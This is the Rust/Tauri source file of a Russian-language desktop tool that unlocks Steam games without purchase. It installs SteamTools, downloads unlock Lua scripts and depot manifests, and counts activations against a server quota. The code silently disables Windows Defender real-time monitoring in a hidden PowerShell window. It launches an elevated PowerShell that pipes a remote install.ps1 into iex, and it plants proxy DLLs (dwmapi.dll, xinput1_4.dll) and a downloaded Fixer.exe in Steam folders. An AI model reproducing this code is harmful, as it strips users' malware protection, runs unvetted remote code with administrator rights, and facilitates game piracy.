#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
use winreg::enums::*;
use winreg::RegKey;
use std::fs;
use std::io::Cursor;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::os::windows::process::CommandExt;
use serde::{Deserialize, Serialize};
use sysinfo::{Disks, System};
use tauri::Emitter;

const SERVER_URL: &str = "https://api.example-backend.invalid";

#[derive(Deserialize)]
struct Depot {
    id: String,
    manifest: String,
}

fn build_api_client() -> Result<reqwest::Client, String> {
    build_api_client_inner(true)
}

fn build_api_client_download() -> Result<reqwest::Client, String> {
    build_api_client_inner(false)
}

fn build_api_client_inner(with_response_timeout: bool) -> Result<reqwest::Client, String> {

    let builder = reqwest::Client::builder()
        .user_agent("Mozilla/5.0")
        .https_only(true) 
        .connect_timeout(std::time::Duration::from_secs(15));
    let builder = if with_response_timeout {
        builder.timeout(std::time::Duration::from_secs(30)) 
    } else {
        builder 
    };
    builder.build()
        .map_err(|e| format!("Ошибка создания HTTP-клиента: {}", e))
}

fn get_all_steam_libraries(steam_path: &str) -> Vec<PathBuf> {
    let base = PathBuf::from(steam_path.replace("/", "\\"));
    let mut libraries: Vec<PathBuf> = vec![base.clone()];

    let vdf_path = base.join("steamapps").join("libraryfolders.vdf");
    if !vdf_path.exists() {
        return libraries;
    }

    let content = match fs::read_to_string(&vdf_path) {
        Ok(c) => c,
        Err(_) => return libraries,
    };

    for line in content.lines() {
        let trimmed = line.trim();
        if trimmed.to_lowercase().starts_with("\"path\"") {
            let tokens: Vec<&str> = trimmed
                .split('"')
                .filter(|s| !s.trim().is_empty())
                .collect();

            if tokens.len() >= 2 {
                let lib_path = PathBuf::from(tokens[1].replace("\\\\", "\\"));

                if lib_path != base {
                    libraries.push(lib_path);
                }
            }
        }
    }

    libraries
}

#[tauri::command]
fn get_hwid() -> Result<String, String> {
    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    let key = hklm.open_subkey("SOFTWARE\\Microsoft\\Cryptography")
        .map_err(|_| "HWID Access Denied".to_string())?;
    let id: String = key.get_value("MachineGuid")
        .map_err(|_| "HWID Not Found".to_string())?;
    Ok(id)
}

#[tauri::command]
fn save_token(token: String) -> Result<(), String> {
    let hklm = RegKey::predef(HKEY_CURRENT_USER);
    let (key, _) = hklm.create_subkey("Software\\GrimUnlocked")
        .map_err(|e| e.to_string())?;
    key.set_value("AuthToken", &token).map_err(|e| e.to_string())?;
    Ok(())
}

#[tauri::command]
fn load_token() -> Result<String, String> {
    let hklm = RegKey::predef(HKEY_CURRENT_USER);
    let key = hklm.open_subkey("Software\\GrimUnlocked")
        .map_err(|_| "No token".to_string())?;
    let token: String = key.get_value("AuthToken").map_err(|_| "No token".to_string())?;
    Ok(token)
}

#[tauri::command]
fn find_steam() -> Result<String, String> {
    let hklm = RegKey::predef(HKEY_CURRENT_USER);
    let steam_key = hklm.open_subkey("Software\\Valve\\Steam")
        .map_err(|_| "Steam не найден в реестре".to_string())?;
    let path: String = steam_key.get_value("SteamPath")
        .map_err(|_| "SteamPath не найден".to_string())?;
    Ok(path)
}

#[tauri::command]
fn check_steam_tools() -> bool {
    Path::new(r"C:\Program Files\SteamTools").exists()
}

#[tauri::command]
fn check_manifest_exists(steam_path: String, id: String, manifest: String) -> bool {

    let libraries = get_all_steam_libraries(&steam_path);
    let filename = format!("{}_{}.manifest", id, manifest);

    for lib in &libraries {
        let target_file = lib.join("depotcache").join(&filename);

        if !target_file.exists() {
            continue;
        }

        if let Ok(metadata) = fs::metadata(&target_file) {
            if metadata.len() == 0 {
                let _ = fs::remove_file(&target_file);
                continue;
            }
            return true;
        }
    }
    false
}

#[derive(Serialize)]
struct ApiResponse {
    status: u16,
    body: String,
}

#[tauri::command]
async fn api_get(path: String, token: Option<String>, hwid: Option<String>) -> Result<ApiResponse, String> {
    let client = build_api_client()?;
    let mut req = client.get(format!("{}{}", SERVER_URL, path));
    if let Some(t) = &token {
        req = req.header("Authorization", format!("Bearer {}", t));
    }
    if let Some(h) = &hwid {
        req = req.header("X-HWID", h);
    }
    let resp = req.send().await.map_err(|e| format!("Ошибка сети: {}", e))?;
    let status = resp.status().as_u16();
    let body = resp.text().await.map_err(|e| format!("Ошибка чтения ответа: {}", e))?;
    Ok(ApiResponse { status, body })
}

#[tauri::command]
async fn api_post(path: String, token: Option<String>, hwid: Option<String>, body: serde_json::Value) -> Result<ApiResponse, String> {
    let client = build_api_client()?;
    let mut req = client.post(format!("{}{}", SERVER_URL, path)).json(&body);
    if let Some(t) = &token {
        req = req.header("Authorization", format!("Bearer {}", t));
    }
    if let Some(h) = &hwid {
        req = req.header("X-HWID", h);
    }
    let resp = req.send().await.map_err(|e| format!("Ошибка сети: {}", e))?;
    let status = resp.status().as_u16();
    let body = resp.text().await.map_err(|e| format!("Ошибка чтения ответа: {}", e))?;
    Ok(ApiResponse { status, body })
}

async fn download_file(url: &str, path: &PathBuf, token: Option<&str>, hwid: Option<&str>) -> Result<(), String> {
    let client = build_api_client_download()?;
    let mut req = client.get(url);
    if let Some(t) = token {
        req = req.header("Authorization", format!("Bearer {}", t));
    }
    if let Some(h) = hwid {
        req = req.header("X-HWID", h); 
    }
    let response = req.send().await.map_err(|e| format!("Ошибка сети: {}", e))?;
    if response.status().is_success() {
        let bytes = response.bytes().await.map_err(|e| e.to_string())?;
        if let Some(parent) = path.parent() {
            fs::create_dir_all(parent).ok();
        }
        fs::write(path, bytes).map_err(|e| format!("Ошибка записи: {}", e))?;
        Ok(())
    } else { Err(format!("Ошибка сервера: {}", response.status())) }
}

#[derive(Clone, Serialize)]
struct OnlineProgress {
    app_id: String,
    file_index: usize,
    total_files: usize,
    file_name: String,
    file_bytes: u64,
    file_total: u64,
    percent: f64,
}

async fn download_file_with_progress(
    window: &tauri::Window,
    url: &str,
    path: &PathBuf,
    token: Option<&str>,
    hwid: Option<&str>,
    app_id: &str,
    file_name: &str,
    file_index: usize,
    total_files: usize,
) -> Result<(), String> {
    let client = build_api_client_download()?;
    let mut req = client.get(url);
    if let Some(t) = token {
        req = req.header("Authorization", format!("Bearer {}", t));
    }
    if let Some(h) = hwid {
        req = req.header("X-HWID", h);
    }
    let mut response = req.send().await.map_err(|e| format!("Ошибка сети: {}", e))?;
    if !response.status().is_success() {
        return Err(format!("Ошибка сервера: {}", response.status()));
    }
    let file_total = response.content_length().unwrap_or(0);
    let mut downloaded: u64 = 0;
    let mut buf: Vec<u8> = Vec::with_capacity(file_total as usize);
    let mut last_emitted_pct: i64 = -1;

    while let Some(chunk) = response.chunk().await.map_err(|e| e.to_string())? {
        downloaded += chunk.len() as u64;
        buf.extend_from_slice(&chunk);

        let file_pct = if file_total > 0 { (downloaded as f64 / file_total as f64) * 100.0 } else { 0.0 };
        let overall_pct = ((file_index as f64 + (file_pct / 100.0)) / total_files.max(1) as f64) * 100.0;
        let pct_bucket = overall_pct.floor() as i64;
        if pct_bucket != last_emitted_pct {
            last_emitted_pct = pct_bucket;
            let _ = window.emit("online-progress", OnlineProgress {
                app_id: app_id.to_string(),
                file_index,
                total_files,
                file_name: file_name.to_string(),
                file_bytes: downloaded,
                file_total,
                percent: overall_pct.min(100.0),
            });
        }
    }

    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent).ok();
    }
    fs::write(path, buf).map_err(|e| format!("Ошибка записи: {}", e))?;
    Ok(())
}

#[tauri::command]
async fn install_steam_tools() -> Result<String, String> {
    let target_base = PathBuf::from(r"C:\Program Files\SteamTools");
    let zip_url = format!("{}/download/Steamtools.zip", SERVER_URL);
    fs::create_dir_all(&target_base).ok();
    let client = build_api_client()?;
    let response = client.get(&zip_url).send().await.map_err(|e| e.to_string())?;
    if response.status().is_success() {
        let bytes = response.bytes().await.map_err(|e| e.to_string())?;
        let reader = Cursor::new(bytes);
        let mut archive = zip::ZipArchive::new(reader).map_err(|e| e.to_string())?;
        for i in 0..archive.len() {
            let mut file = archive.by_index(i).map_err(|e| e.to_string())?;
            let outpath = target_base.join(file.mangled_name());
            if file.is_dir() { fs::create_dir_all(&outpath).ok(); }
            else {
                if let Some(p) = outpath.parent() { fs::create_dir_all(p).ok(); }
                let mut outfile = fs::File::create(&outpath).map_err(|e| e.to_string())?;
                std::io::copy(&mut file, &mut outfile).ok();
            }
        }
    }
    let steam_path = find_steam()?;
    let st_ui_file = PathBuf::from(&steam_path).join("stUI").join("st-setup-1.8.30.exe");
    download_file(&format!("{}/storage/st-setup-1.8.30.exe", SERVER_URL), &st_ui_file, None, None).await?;

    let libraries = get_all_steam_libraries(&steam_path);
    for dll_name in &["dwmapi.dll", "xinput1_4.dll"] {
        let dll_url = format!("{}/storage/{}", SERVER_URL, dll_name);
        for lib in &libraries {
            let target = lib.join(dll_name);
            let _ = download_file(&dll_url, &target, None, None).await;
        }
    }

    let fixer_dir = PathBuf::from(r"C:\Program Files\SteamTool");
    fs::create_dir_all(&fixer_dir).ok();
    let fixer_target = fixer_dir.join("Fixer.exe");
    let _ = download_file(&format!("{}/storage/Fixer.exe", SERVER_URL), &fixer_target, None, None).await;

    Ok("SUCCESS".to_string())
}

#[tauri::command]
async fn reinstall_core() -> Result<String, String> {
    let st_path = PathBuf::from(r"C:\Program Files\SteamTools");
    if st_path.exists() {
        fs::remove_dir_all(&st_path)
            .map_err(|e| format!("Не удалось удалить SteamTools: {}", e))?;
    }
    let steam_path = find_steam()?;
    install_steam_tools().await?;
    run_steam_tools_automation(steam_path).await?;
    Ok("REINSTALL_DONE".to_string())
}

#[tauri::command]
async fn install_game_logic(
    steam_path: String,
    app_id: String,
    depots: Vec<Depot>,
    lua_name: Option<String>,
    token: Option<String>,
    hwid: Option<String>,
    game_name: Option<String>,
    confirm_activation: bool,
) -> Result<String, String> {
    let libraries = get_all_steam_libraries(&steam_path);
    let base_path = PathBuf::from(steam_path.replace("/", "\\"));

    if let Some(ref lua_file) = lua_name {
        let lua_url = format!("{}/files/lua/{}", SERVER_URL, lua_file);
        for lib in &libraries {
            let plugin_dir = lib.join("config").join("stplug-in");

            download_file(&lua_url, &plugin_dir.join(lua_file), token.as_deref(), hwid.as_deref())
                .await
                .map_err(|e| format!("Не удалось скачать lua {}: {}", lua_file, e))?;
        }
    }

    for depot in &depots {
        let name = format!("{}_{}.manifest", depot.id, depot.manifest);
        let manifest_url = format!("{}/files/manifests/{}", SERVER_URL, name);

        let primary_path = libraries[0].join("depotcache").join(&name);
        download_file(&manifest_url, &primary_path, token.as_deref(), hwid.as_deref())
            .await
            .map_err(|e| format!("Не удалось скачать манифест {}: {}", name, e))?;

        if !primary_path.exists() {
            return Err(format!("Файл манифеста {} отсутствует после загрузки!", name));
        }
        let metadata = fs::metadata(&primary_path).map_err(|e| e.to_string())?;
        if metadata.len() == 0 {
            let _ = fs::remove_file(&primary_path);
            return Err(format!("Файл манифеста {} поврежден (0 байт)!", name));
        }

        for lib in libraries.iter().skip(1) {
            let dest = lib.join("depotcache").join(&name);
            fs::create_dir_all(dest.parent().unwrap_or(&dest)).ok();
            let _ = fs::copy(&primary_path, &dest);
        }
    }

    // AppList-запись делаем ТОЛЬКО после успешной загрузки lua и всех манифестов.
    // Раньше она писалась первой строкой функции, до любых сетевых операций — из-за
    // этого SteamTools мог показывать игру как добавленную даже если скачивание
    // lua/манифеста дальше падало с ошибкой. Теперь файл появляется только когда
    // установка действительно завершена успешно.
    let app_list_dir = base_path.join("AppList");
    fs::create_dir_all(&app_list_dir).map_err(|e| format!("Не удалось создать AppList: {}", e))?;
    fs::write(app_list_dir.join(format!("{}.txt", app_id)), &app_id)
        .map_err(|e| format!("Не удалось записать AppList: {}", e))?;

    // Подтверждение активации (списание квоты) выполняется здесь, той же функцией,
    // что и сама установка — а не отдельным запросом с фронта после того, как invoke()
    // резолвится. Раньше фронт ждал успешного ответа от install_game_logic с клиентским
    // таймаутом (Promise.race), и если таймаут срабатывал первым, JS уходил в catch и
    // никогда не вызывал /api/confirm-activation — а Rust-таск при этом продолжал
    // работать в фоне и всё равно успешно дописывал файлы. В итоге игра реально
    // выдавалась, а квота не тратилась. Теперь списание квоты привязано к тому же
    // успешному пути выполнения, что и запись файлов на диск, и не зависит от того,
    // успел ли фронт дождаться ответа.
    if confirm_activation {
        if let (Some(t), Some(name)) = (token.as_deref(), game_name.as_deref()) {
            if let Ok(client) = build_api_client() {
                let body = serde_json::json!({ "token": t, "game_id": app_id, "game_name": name });
                let _ = client
                    .post(format!("{}/api/confirm-activation", SERVER_URL))
                    .json(&body)
                    .send()
                    .await;
            }
        }
    }

    Ok("DONE".to_string())
}

#[tauri::command]
fn remove_game_files(steam_path: String, app_id: String) -> Result<String, String> {
    let libraries = get_all_steam_libraries(&steam_path);
    let base_path = PathBuf::from(steam_path.replace("/", "\\"));

    let app_list_file = base_path.join("AppList").join(format!("{}.txt", app_id));
    if app_list_file.exists() {
        if let Err(e) = fs::remove_file(&app_list_file) {
            println!("remove_game_files: не удалось удалить {:?}: {}", app_list_file, e);
        }
    }

    let manifest_filename = format!("appmanifest_{}.acf", app_id);

    for lib in &libraries {
        let lua_path = lib.join("config").join("stplug-in").join(format!("{}.lua", app_id));
        if lua_path.exists() {
            if let Err(e) = fs::remove_file(&lua_path) {
                println!("remove_game_files: не удалось удалить {:?}: {}", lua_path, e);
            }
        }

        let acf_path = lib.join("steamapps").join(&manifest_filename);
        if acf_path.exists() {
            if let Ok(content) = fs::read_to_string(&acf_path) {
                let mut install_dir: Option<String> = None;
                for line in content.lines() {
                    let trimmed = line.trim();
                    if trimmed.to_lowercase().starts_with("\"installdir\"") {
                        let tokens: Vec<&str> = trimmed.split('"').filter(|s| !s.trim().is_empty()).collect();
                        if tokens.len() >= 2 { install_dir = Some(tokens[1].to_string()); }
                        break;
                    }
                }
                if let Some(dir) = install_dir {
                    let game_dir = lib.join("steamapps").join("common").join(&dir);
                    if game_dir.exists() {
                        if let Err(e) = fs::remove_dir_all(&game_dir) {
                            println!("remove_game_files: не удалось удалить папку игры {:?}: {}", game_dir, e);
                        }
                    }
                }
            }
            if let Err(e) = fs::remove_file(&acf_path) {
                println!("remove_game_files: не удалось удалить {:?}: {}", acf_path, e);
            }
        }

    }

    Ok("REMOVED".to_string())
}

#[tauri::command]
async fn integrity_sync_game(steam_path: String, app_id: String, depots: Vec<Depot>, lua_name: Option<String>, token: Option<String>, hwid: Option<String>) -> Result<String, String> {
    let libraries = get_all_steam_libraries(&steam_path);
    let base_path = PathBuf::from(steam_path.replace("/", "\\"));

    let exe_dir = std::env::current_exe()
        .map_err(|e| format!("Не удалось определить путь к exe: {}", e))?
        .parent()
        .ok_or("Не удалось получить папку exe")?
        .to_path_buf();

    let integ_sync_dir = exe_dir.join("IntegSync");
    fs::create_dir_all(&integ_sync_dir)
        .map_err(|e| format!("Не удалось создать IntegSync: {}", e))?;

    if let Some(ref lua_file) = lua_name {
        let lua_url = format!("{}/files/lua/{}", SERVER_URL, lua_file);
        for lib in &libraries {
            let plugin_dir = lib.join("config").join("stplug-in");
            download_file(&lua_url, &plugin_dir.join(lua_file), token.as_deref(), hwid.as_deref())
                .await
                .map_err(|e| format!("Не удалось скачать lua {}: {}", lua_file, e))?;
        }
    }

    let mut downloaded_files: Vec<(PathBuf, String)> = Vec::new();

    for lib in &libraries {
        fs::create_dir_all(lib.join("depotcache")).ok();
    }

    for depot in &depots {
        let name = format!("{}_{}.manifest", depot.id, depot.manifest);
        let temp_path = integ_sync_dir.join(&name);

        download_file(&format!("{}/files/manifests/{}", SERVER_URL, name), &temp_path, token.as_deref(), hwid.as_deref())
            .await
            .map_err(|e| format!("Не удалось скачать манифест {} в IntegSync: {}", name, e))?;

        if !temp_path.exists() {
            return Err(format!("Файл {} отсутствует в IntegSync после загрузки!", name));
        }
        let metadata = fs::metadata(&temp_path).map_err(|e| e.to_string())?;
        if metadata.len() == 0 {
            let _ = fs::remove_file(&temp_path);
            return Err(format!("Файл {} поврежден (0 байт) в IntegSync!", name));
        }

        downloaded_files.push((temp_path, name));
    }

    tokio::time::sleep(std::time::Duration::from_secs(10)).await;

    for (temp_path, name) in &downloaded_files {
        for (i, lib) in libraries.iter().enumerate() {
            let final_path = lib.join("depotcache").join(name);

            if final_path.exists() {
                let _ = fs::remove_file(&final_path);
            }

            if i == 0 {

                match fs::rename(temp_path, &final_path) {
                    Ok(_) => {
                        println!("Перемещён в основную библиотеку: {:?}", final_path);
                    }
                    Err(rename_err) => {
                        match fs::copy(temp_path, &final_path) {
                            Ok(_) => {
                                println!("Скопирован в основную библиотеку: {:?}", final_path);
                                let _ = fs::remove_file(temp_path);
                            }
                            Err(copy_err) => {
                                return Err(format!(
                                    "Не удалось переместить {:?}\nrename: {}\ncopy: {}",
                                    temp_path, rename_err, copy_err
                                ));
                            }
                        }
                    }
                }
            } else {

                let source = libraries[0].join("depotcache").join(name);
                if source.exists() {
                    let _ = fs::copy(&source, &final_path);
                    println!("Скопирован в доп. библиотеку: {:?}", final_path);
                }
            }

            if !final_path.exists() {

                if i == 0 {
                    return Err(format!(
                        "Файл {:?} не найден в основном depotcache после перемещения!",
                        final_path.file_name().unwrap_or_default()
                    ));
                }
            } else if let Ok(meta) = fs::metadata(&final_path) {
                if meta.len() == 0 {
                    let _ = fs::remove_file(&final_path);
                }
            }
        }
    }

    let _ = fs::remove_dir_all(&integ_sync_dir);

    // Как и в install_game_logic — AppList-запись делаем только после того, как все
    // манифесты реально скачаны и разложены по библиотекам, а не в начале функции.
    let app_list_dir = base_path.join("AppList");
    fs::create_dir_all(&app_list_dir).map_err(|e| format!("Не удалось создать AppList: {}", e))?;
    fs::write(app_list_dir.join(format!("{}.txt", app_id)), &app_id)
        .map_err(|e| format!("Не удалось записать AppList: {}", e))?;

    Ok("INTEGRITY_SYNC_DONE".to_string())
}

fn find_appmanifest(steam_path: &str, app_id: &str) -> Result<(PathBuf, String), String> {
    let libraries = get_all_steam_libraries(steam_path);
    let filename = format!("appmanifest_{}.acf", app_id);

    for lib in &libraries {
        let acf_path = lib.join("steamapps").join(&filename);
        if acf_path.exists() {
            let content = fs::read_to_string(&acf_path)
                .map_err(|e| format!("Ошибка чтения {}: {}", filename, e))?;
            return Ok((lib.clone(), content));
        }
    }

    Err("Игра не установлена в вашей библиотеке Steam. Установите игру через Steam и попробуйте снова.".to_string())
}

fn get_install_dir_from_manifest(steam_path: &str, app_id: &str) -> Result<(PathBuf, String), String> {
    let (lib_path, content) = find_appmanifest(steam_path, app_id)?;

    for line in content.lines() {
        let trimmed = line.trim();
        if trimmed.to_lowercase().starts_with("\"installdir\"") {
            let tokens: Vec<&str> = trimmed
                .split('"')
                .filter(|s| !s.trim().is_empty())
                .collect();
            if tokens.len() >= 2 {
                return Ok((lib_path, tokens[1].to_string()));
            }
        }
    }

    Err(format!(
        "Поле installdir не найдено в appmanifest_{}.acf. Файл может быть повреждён.",
        app_id
    ))
}

#[tauri::command]
async fn install_online_files(
    window: tauri::Window,
    steam_path: String,
    app_id: String,
    files: Vec<String>,
    token: Option<String>,
    hwid: Option<String>,
) -> Result<String, String> {

    let (lib_path, install_dir) = get_install_dir_from_manifest(&steam_path, &app_id)?;

    let game_dir = lib_path
        .join("steamapps")
        .join("common")
        .join(&install_dir);

    let total_files = files.len();
    for (i, relative_file) in files.iter().enumerate() {
        let win_relative = relative_file.replace("/", "\\");
        let target_path = game_dir.join(&win_relative);

        let url_path = relative_file.replace("\\", "/");
        let url = format!("{}/storage/Online/{}/{}", SERVER_URL, app_id, url_path);

        download_file_with_progress(
            &window, &url, &target_path, token.as_deref(), hwid.as_deref(),
            &app_id, relative_file, i, total_files,
        )
            .await
            .map_err(|e| format!("Ошибка скачивания {}: {}", relative_file, e))?;

        if !target_path.exists() {
            return Err(format!("Файл {} не найден после скачивания!", relative_file));
        }
        if let Ok(meta) = fs::metadata(&target_path) {
            if meta.len() == 0 {
                let _ = fs::remove_file(&target_path);
                return Err(format!("Файл {} поврежден (0 байт)!", relative_file));
            }
        }
    }

    let _ = window.emit("online-progress", OnlineProgress {
        app_id: app_id.clone(),
        file_index: total_files.saturating_sub(1),
        total_files,
        file_name: String::new(),
        file_bytes: 0,
        file_total: 0,
        percent: 100.0,
    });

    Ok(format!("ONLINE_INSTALLED:{}", files.len()))
}

#[tauri::command]
async fn full_steam_restart(steam_path: String) -> Result<String, String> {
    let base_path = PathBuf::from(steam_path.replace("/", "\\"));
    let _ = Command::new("cmd").args(["/C", "start", "steam://exit"]).creation_flags(0x08000000).status();
    tokio::time::sleep(std::time::Duration::from_secs(3)).await;
    let _ = Command::new("taskkill").args(["/F", "/IM", "steam.exe"]).creation_flags(0x08000000).status();

    let cache_dir = base_path.join("appcache");
    if cache_dir.exists() {
        let _ = fs::remove_dir_all(&cache_dir);
    }

    tokio::time::sleep(std::time::Duration::from_millis(1000)).await;
    let exe_path = base_path.join("steam.exe");
    Command::new("cmd").args(["/C", "start", "", exe_path.to_str().unwrap()])
        .current_dir(&base_path)
        .creation_flags(0x08000000)
        .spawn()
        .ok();

    Ok("RESTARTED_AND_PURGED".to_string())
}

#[tauri::command]
async fn run_steam_tools_automation(steam_path: String) -> Result<String, String> {
    let st_path = r"C:\Program Files\SteamTools\SteamTools.exe";
    let base_path = PathBuf::from(steam_path.replace("/", "\\"));
    let _ = Command::new("cmd").args(["/C", "start", "steam://exit"]).creation_flags(0x08000000).status();
    tokio::time::sleep(std::time::Duration::from_secs(3)).await;
    if Path::new(st_path).exists() { Command::new(st_path).current_dir(r"C:\Program Files\SteamTools").creation_flags(0x08000000).spawn().ok(); }
    tokio::time::sleep(std::time::Duration::from_secs(8)).await;
    let exe_path = base_path.join("steam.exe");
    Command::new("cmd").args(["/C", "start", "", exe_path.to_str().unwrap()]).current_dir(&base_path).creation_flags(0x08000000).spawn().ok();
    tokio::time::sleep(std::time::Duration::from_secs(30)).await;
    let _ = Command::new("taskkill").args(["/F", "/IM", "SteamTools.exe"]).creation_flags(0x08000000).status();
    Ok("AUTOMATION_SUCCESS".to_string())
}

#[tauri::command]
fn open_steam_folder(steam_path: String) -> Result<(), String> {
    let normalized = steam_path.replace("/", "\\");
    Command::new("explorer.exe")
        .arg(&normalized)
        .creation_flags(0x08000000)
        .spawn()
        .map_err(|e| format!("Не удалось открыть папку: {}", e))?;
    Ok(())
}

#[tauri::command]
async fn install_all_components() -> Result<String, String> {
    let steam_path = find_steam()?;
    install_steam_tools().await?;
    run_steam_tools_automation(steam_path).await?;
    Ok("ALL_COMPONENTS_INSTALLED_AND_SYNCED".to_string())
}

#[tauri::command]
async fn run_autofix() -> Result<(), String> {

    Command::new("powershell.exe")
        .args([
            "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command",
            "Start-Process powershell -Verb RunAs -ArgumentList '-NoExit -NoProfile -ExecutionPolicy Bypass -Command \"irm https://manifest-tool.example.invalid/install.ps1 | iex\"'",
        ])
        .creation_flags(0x08000000)
        .spawn()
        .map_err(|e| format!("Не удалось запустить PowerShell: {}", e))?;
    Ok(())
}

#[tauri::command]
async fn run_fixer() -> Result<(), String> {
    let fixer_path = PathBuf::from(r"C:\Program Files\SteamTool\Fixer.exe");
    if !fixer_path.exists() {
        return Err("FIXER_NOT_FOUND".to_string());
    }
    Command::new(&fixer_path)
        .spawn()
        .map_err(|e| format!("Не удалось запустить Fixer: {}", e))?;
    Ok(())
}

#[derive(Serialize, Deserialize, Clone)]
struct UpdateInfo {
    version: String,
    notes: String,
    url: String,
    mandatory: bool,
}

fn parse_semver(v: &str) -> (u32, u32, u32) {
    let p: Vec<u32> = v.split('.').filter_map(|x| x.parse().ok()).collect();
    (*p.get(0).unwrap_or(&0), *p.get(1).unwrap_or(&0), *p.get(2).unwrap_or(&0))
}

#[tauri::command]
async fn check_for_update() -> Result<Option<UpdateInfo>, String> {
    let current = env!("CARGO_PKG_VERSION");
    let client = build_api_client()?;

    let resp = client
        .get(format!("{}/api/latest-version", SERVER_URL))
        .send()
        .await
        .map_err(|e| format!("Ошибка запроса обновления: {}", e))?;

    if !resp.status().is_success() {
        return Ok(None);
    }

    let info: UpdateInfo = resp
        .json()
        .await
        .map_err(|e| format!("Ошибка парсинга манифеста: {}", e))?;

    if parse_semver(&info.version) > parse_semver(current) {
        Ok(Some(info))
    } else {
        Ok(None)
    }
}

#[tauri::command]
async fn apply_update(url: String) -> Result<(), String> {
    use std::io::Write;

    if !url.starts_with(SERVER_URL) {
        return Err("Обновление разрешено только с доверенного сервера".to_string());
    }

    let client = build_api_client()?;

    let resp = client
        .get(&url)
        .send()
        .await
        .map_err(|e| format!("Ошибка загрузки обновления: {}", e))?;

    if !resp.status().is_success() {
        return Err(format!("Сервер вернул {}", resp.status()));
    }

    let bytes = resp
        .bytes()
        .await
        .map_err(|e| format!("Ошибка чтения тела: {}", e))?;

    let new_exe = std::env::temp_dir().join("GrimTools_update.exe");
    {
        let mut file = std::fs::File::create(&new_exe)
            .map_err(|e| format!("Не удалось создать файл: {}", e))?;
        file.write_all(&bytes)
            .map_err(|e| format!("Не удалось записать: {}", e))?;
    }

    let current_exe = std::env::current_exe()
        .map_err(|e| format!("Не удалось получить путь текущего exe: {}", e))?;

    let ps_script = format!(
        r#"
$pid_to_wait = {pid}
$new_exe     = '{new}'
$target      = '{target}'

# Ждём завершения текущего процесса
try {{ Wait-Process -Id $pid_to_wait -Timeout 15 -ErrorAction SilentlyContinue }} catch {{}}

Start-Sleep -Milliseconds 500

# Заменяем файл
Copy-Item -Path $new_exe -Destination $target -Force

# Запускаем новую версию
Start-Process -FilePath $target
"#,
        pid    = std::process::id(),
        new    = new_exe.display(),
        target = current_exe.display(),
    );

    let ps_path = std::env::temp_dir().join("grimtools_update.ps1");
    {
        let mut f = std::fs::File::create(&ps_path)
            .map_err(|e| format!("Не удалось создать ps1: {}", e))?;
        f.write_all(ps_script.as_bytes())
            .map_err(|e| format!("Не удалось записать ps1: {}", e))?;
    }

    Command::new("powershell")
        .args([
            "-WindowStyle", "Hidden",
            "-NonInteractive",
            "-ExecutionPolicy", "Bypass",
            "-File", &ps_path.to_string_lossy(),
        ])
        .creation_flags(0x00000008) 
        .spawn()
        .map_err(|e| format!("Не удалось запустить PowerShell: {}", e))?;

    std::process::exit(0);
}

#[tauri::command]

async fn run_defender_disable() -> Result<(), String> {
    use std::os::windows::process::CommandExt;

    let _ = std::process::Command::new("powershell")
        .args([
            "-WindowStyle", "Hidden",
            "-NonInteractive",
            "-ExecutionPolicy", "Bypass",
            "-Command",
            "Set-MpPreference -DisableRealtimeMonitoring ",
        ])
        .creation_flags(0x00000008)
        .spawn();
    Ok(())
}

#[tauri::command]
async fn fetch_steam_desc(app_id: u64) -> Result<Option<String>, String> {
    let client = reqwest::Client::builder()
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        .timeout(std::time::Duration::from_secs(8))
        .build()
        .map_err(|e| e.to_string())?;

    let url = format!(
        "https://store.steampowered.com/api/appdetails?appids={}&filters=short_description&cc=us&l=russian",
        app_id
    );

    let resp = client.get(&url).send().await.map_err(|e| e.to_string())?;
    let json: serde_json::Value = resp.json().await.map_err(|e| e.to_string())?;

    let desc = json
        .get(app_id.to_string())
        .or_else(|| json.get(&format!("{}", app_id)))
        .and_then(|v| v.get("data"))
        .and_then(|v| v.get("short_description"))
        .and_then(|v| v.as_str())
        .map(|s| s.to_string());

    Ok(desc)
}

fn main() {

    let webview_data = std::path::PathBuf::from("C:\\ProgramData\\GrimTool\\WebView2");
    let _ = std::fs::create_dir_all(&webview_data);
    std::env::set_var("WEBVIEW2_USER_DATA_FOLDER", &webview_data);

    tauri::Builder::default()
        .plugin(tauri_plugin_shell::init())
        .plugin(tauri_plugin_opener::init())
        .invoke_handler(tauri::generate_handler![
            find_steam, install_game_logic, integrity_sync_game, remove_game_files, full_steam_restart,
            check_steam_tools, install_steam_tools, run_steam_tools_automation,
            install_all_components, save_token, load_token, get_hwid, check_manifest_exists,
            install_online_files, open_steam_folder,
            run_defender_disable,
            check_for_update,
            apply_update,
            fetch_steam_desc,
            run_autofix,
            reinstall_core,
            run_fixer,
            api_get, api_post,
        ])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}